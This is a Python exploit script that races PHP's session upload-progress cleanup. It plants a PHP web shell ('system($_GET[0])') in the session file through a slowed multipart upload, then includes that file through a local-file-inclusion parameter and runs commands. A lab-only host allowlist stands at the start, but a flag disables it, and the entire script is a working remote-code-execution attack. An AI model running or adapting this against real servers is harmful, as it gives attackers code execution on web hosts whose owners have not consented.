#!/usr/bin/env python3
"""Race the default session.upload_progress.cleanup=1 window.

The upload is slowed down; a concurrent LFI request tries to include the
session file before the cleanup at MULTIPART_EVENT_END. Local lab only.
"""
from __future__ import annotations

import argparse
import http.client
import secrets
import sys
import threading
import time
from urllib.parse import urlencode, urlparse

ALLOWED = {"127.0.0.1", "localhost", "::1", "php-vuln", "php-cleanup", "nginx"}


def get_lfi(host: str, port: int, path: str, sid: str, stop: threading.Event, hits: list[str]) -> None:
    query = urlencode({"file": f"/tmp/sess_{sid}", "0": "id"})
    while not stop.is_set():
        try:
            conn = http.client.HTTPConnection(host, port, timeout=2)
            conn.request("GET", path + "?" + query, headers={"Cookie": f"PHPSESSID={sid}"})
            resp = conn.getresponse()
            body = resp.read()
            conn.close()
            if b"uid=" in body:
                hits.append(body.decode("utf-8", "replace"))
                stop.set()
                return
        except OSError:
            pass
        time.sleep(0.01)


def attempt(host: str, port: int, path: str, stall: float) -> bool:
    sid = "race" + secrets.token_hex(12)
    boundary = "----r" + secrets.token_hex(8)
    payload = "<?php system($_GET[0]);?>"
    head = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"{payload}\r\n"
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n"
    ).encode() + b"A" * 6000
    tail = b"Y" * 65536 + f"\r\n--{boundary}--\r\n".encode()
    total = len(head) + len(tail)
    conn = http.client.HTTPConnection(host, port, timeout=20)
    conn.putrequest("POST", path)
    conn.putheader("Content-Type", f"multipart/form-data; boundary={boundary}")
    conn.putheader("Content-Length", str(total))
    conn.putheader("Cookie", f"PHPSESSID={sid}")
    conn.endheaders()
    conn.send(head)
    stop = threading.Event()
    hits: list[str] = []
    t = threading.Thread(target=get_lfi, args=(host, port, path, sid, stop, hits), daemon=True)
    t.start()
    time.sleep(stall)
    conn.send(tail)
    try:
        resp = conn.getresponse()
        resp.read()
    except OSError:
        pass
    conn.close()
    time.sleep(0.2)
    stop.set()
    t.join(timeout=1.0)
    if hits:
        first = hits[0].strip().splitlines()
        print(f"[+] sid={sid} hit: {first[0] if first else '(empty)'}")
        return True
    print(f"[-] sid={sid} no hit")
    return False


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://127.0.0.1:8088/index.php")
    parser.add_argument("--stall", type=float, default=1.5)
    parser.add_argument("--attempts", type=int, default=5)
    parser.add_argument("--allow-nonlocal", action="store_true")
    args = parser.parse_args()
    parsed = urlparse(args.target)
    if parsed.hostname not in ALLOWED and not args.allow_nonlocal:
        raise SystemExit(f"refusing non-lab host {parsed.hostname!r}")
    host, port = parsed.hostname, parsed.port or 80
    path = parsed.path or "/index.php"
    wins = 0
    for i in range(args.attempts):
        print(f"[*] attempt {i + 1}/{args.attempts}")
        wins += int(attempt(host, port, path, args.stall))
    print(f"[*] wins={wins}/{args.attempts}")
    return 0 if wins else 1


if __name__ == "__main__":
    sys.exit(main())
